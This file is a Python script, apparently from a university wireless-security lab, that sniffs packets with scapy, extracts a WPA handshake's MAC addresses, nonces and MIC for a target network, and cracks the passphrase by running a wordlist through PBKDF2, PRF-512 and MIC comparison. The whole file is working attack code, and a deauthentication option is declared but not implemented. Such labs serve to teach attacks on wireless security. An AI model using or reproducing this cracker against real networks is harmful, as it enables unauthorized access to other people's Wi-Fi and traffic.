#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Scairodump
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"
__modified_by__ = "Blanc Jean-Luc & Plancherel Noémie"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import argparse

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# add all arguments to parser
parser = argparse.ArgumentParser(description="A python script to crack passphrase and deauthenticate client")
parser.add_argument('interface', action="store", help="Specify a monitoring interface (ex. mon0)") 
parser.add_argument("-d" , "--deauth", help="Specify if you want to deauthenticate after cracking passphrase", action="store_true")

args = parser.parse_args()
iface = args.interface
deauth = args.deauth

# Sniffing network on interface
wpa = sniff(iface=iface, count=500)

# Name of network we want to attack
ssid        = "SWI"
mic_to_test = b''
APmac       = b''
Clientmac   = b''
ANonce      = b''
SNonce      = b''



# Get APmac address and Clientmac address of capture
# We are looking for an Association Request because it contains all parameters we need
# We also check that ssid is the one that we are looking for
for packet in wpa:
    if packet.type == 0x0 and packet.subtype == 0x0 and packet.info.decode('ascii') == ssid:
        APmac = a2b_hex(packet.addr1.replace(':', ''))
        print("APmac : ", APmac)
        Clientmac = a2b_hex(packet.addr2.replace(':', ''))
        break
    
# Get Authenticator Nonce
# We are looking for Authentication request in the first key exchange
for packet in wpa:
   if packet.type == 0x2 and packet.subtype == 0x0:
       ANonce = packet.load[13:45]
       break
   
isSNonce = False

# Get Supplicant Nonce and MIC
for packet in wpa:
    # Get the SNonce based on the MAC address
    if not isSNonce and packet.type == 0x2 and packet.subtype == 0x8 :
        SNonce = packet.load[13:45]
        isSNonce = True

        # Get MIC
    elif packet.subtype == 0x8 and packet.type == 0x2 :
        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
    
ssid = str.encode(ssid)

# Open wordlist
passphrases =  open("wordlist.txt", 'r')
# Read every word in worlist 
for passphrase in passphrases:
    
    A    = "Pairwise key expansion"
    B    = min(APmac, Clientmac)+max(APmac, Clientmac)+min(ANonce, SNonce)+max(ANonce, SNonce)
    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    
    passphrase = passphrase.replace("\n", "")
    passphrase = str.encode(passphrase)
    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)
    ptk = customPRF512(pmk,str.encode(A),B)
    
    mic_passphrase = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]

    if(mic_passphrase == mic_to_test):
        print("********************************")
        print("PASSPHRASE FOUND : ", passphrase.decode())
        print("********************************")
        exit(0)
    
    print("PASSPHRASE INCORRECT : ", passphrase.decode())

print("NO PASSPHRASE FOUND !")
exit(1)
